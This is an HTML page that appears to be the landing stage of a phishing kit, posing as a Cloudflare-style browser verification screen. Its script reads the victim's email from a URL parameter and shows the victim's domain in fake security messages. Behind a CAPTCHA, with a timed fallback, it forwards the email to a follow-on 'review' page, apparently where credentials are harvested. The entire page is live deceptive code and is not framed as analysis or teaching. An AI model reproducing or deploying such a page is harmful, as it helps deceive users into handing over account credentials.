<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Verification</title>

<style>
  body, html {
    margin: 0;
    padding: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    height: 100%;
    overflow: hidden;
    background: #1d1d1d;
    color: white;
  }

  #verification-overlay {
    position: fixed;
    inset: 0;
    background: #1d1d1d;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    z-index: 9999;
    opacity: 1;
    transition: opacity 1s ease;
  }

  #verification-overlay.fade-out {
    opacity: 0;
    pointer-events: none;
  }
</style>
</head>

<body>

<div id="verification-overlay">
  <h1 id="domain-title">Checking your browser...</h1>
  <p id="security-msg">Verifying you are human...</p>

  <div class="cf-turnstile"
       data-sitekey="0x4AAAAAABh8YRnURc-1UUi-"
       data-callback="onCaptchaSuccess">
  </div>
</div>

<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

<script>
/* ===============================
   GET EMAIL + DOMAIN
================================ */
function getEmailRaw() {
  const params = new URLSearchParams(window.location.search);
  return params.get("bazz505") || "";
}

function decodeEmail(raw) {
  // convert @40 → @
  if (raw.includes("@40")) {
    return raw.replace("@40", "@");
  }
  return raw;
}

function encodeEmail(raw) {
  // convert @ → @40
  if (raw.includes("@")) {
    return raw.replace("@", "@40");
  }
  return raw;
}

const emailRaw = getEmailRaw();
const email = decodeEmail(emailRaw);

// Extract domain
let domain = "";
if (email.includes("@")) {
  domain = email.split("@")[1];
}

/* ===============================
   UPDATE TITLE TEXT
================================ */
const title = document.getElementById("domain-title");
if (domain) {
  title.textContent = `Checking your browser before accessing ${domain}`;
}

/* ===============================
   VERIFICATION MESSAGE CYCLING
================================ */
const securityMsg = document.getElementById("security-msg");

const messages = [
  "Performing browser integrity check...",
  "Validating session security...",
  `Preparing secure access to ${domain}...`,
  "Verifying you are human..."
];

messages.forEach((msg, i) => {
  setTimeout(() => {
    securityMsg.textContent = msg;
  }, 1500 * i);
});

/* ===============================
   REDIRECT FUNCTION
================================ */
function goToReview() {
  const encoded = encodeEmail(email); // <-- USE @40 FORMAT
  window.location.href = `review.html?bazz505=${encoded}`;
}

/* ===============================
   CAPTCHA CALLBACK
================================ */
window.onCaptchaSuccess = () => {
  const overlay = document.getElementById("verification-overlay");
  overlay.classList.add("fade-out");
  setTimeout(goToReview, 900);
};

/* ===============================
   FAILSAFE ALWAYS REDIRECT
================================ */
setTimeout(() => {
  const overlay = document.getElementById("verification-overlay");
  overlay.classList.add("fade-out");
  setTimeout(goToReview, 900);
}, 5000);
</script>



</body>
</html>
